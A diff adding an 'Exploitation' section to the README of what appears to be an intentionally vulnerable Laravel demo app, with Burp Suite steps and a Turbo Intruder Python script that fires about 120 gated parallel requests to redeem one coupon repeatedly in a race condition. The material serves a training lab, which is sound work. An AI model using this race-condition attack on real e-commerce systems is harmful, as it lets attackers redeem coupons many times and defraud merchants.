@@ -71,10 +71,45 @@ Second part is a simple coupon redeeming app and can be found in Coupons tab. Si
 
 `/coupons/` (POST method) with body `code: 'AEZAKMI'` tries to redeem code AEZAKMI for current cart.
 
+### Exploitation
+
+1. Open up burp suite or similiar tool
+2. Open inbuilt browser, login and navigate to coupons, choose suitable code
+3. Navigate to cart, start intercept mode and apply chosen code
+4. Copy request contents over to repeater
+5. Boot up turbo intruder
+6. Following script is used, where inside post the request to be repeated should be placed. Do not forget to put `\r\n\r\n` at the end of request (otherwise malformed HTTP request exception is raised)
+```python
+   def queueRequests(target, wordlists):
+        engine = RequestEngine(endpoint=target.endpoint,
+                               concurrentConnections=120,
+                               requestsPerConnection=120,
+                               pipeline=False)
+        post = '''
+            \r\n\r\n
+            '''
+
+
+        for i in range(1, 120):
+            engine.queue(post, gate='race')
+
+        engine.openGate('race');
+        engine.complete(timeout=15)
+
+
+        def handleResponse(req, interesting):
+            if interesting:
+                table.add(req)
+```
+7. Start attack and observe results. In case coupon is only redeemed once, make sure laravel is not run with `php artisan serve` but use local webserver like apache
+
+
 ## TODO
 
 - [x] Polls
 - [x] Coupons
+- [x] Polls exploit
+- [x] Coupons exploit
 - [ ] Polls v2 (fixed)
 - [ ] Coupons v2 (fixed)
 
